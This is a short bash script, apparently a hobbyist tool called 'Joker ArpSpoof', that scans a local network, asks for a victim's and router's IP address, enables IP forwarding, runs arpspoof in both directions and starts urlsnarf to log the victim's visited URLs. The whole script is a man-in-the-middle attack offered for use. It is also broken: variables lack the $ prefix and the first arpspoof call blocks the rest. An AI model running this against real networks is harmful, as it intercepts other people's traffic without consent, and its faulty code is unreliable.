#!/bin/bash

clear
figlet Joker ArpSpoof
sleep 1
ifconfig
echo "Enter the network interface i.e wlan0/eth0 something like that"
read intface
echo "Enter first 24 bits of the n/w address:"
read ip
netdiscover -r ip.1/24 
echo "Enter the victim's ip address"
read victim
echo "Enter the router's ip address"
read router
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i intface -t victim router
arpspoof -i intface -t router victim
urlsnarf -i intface
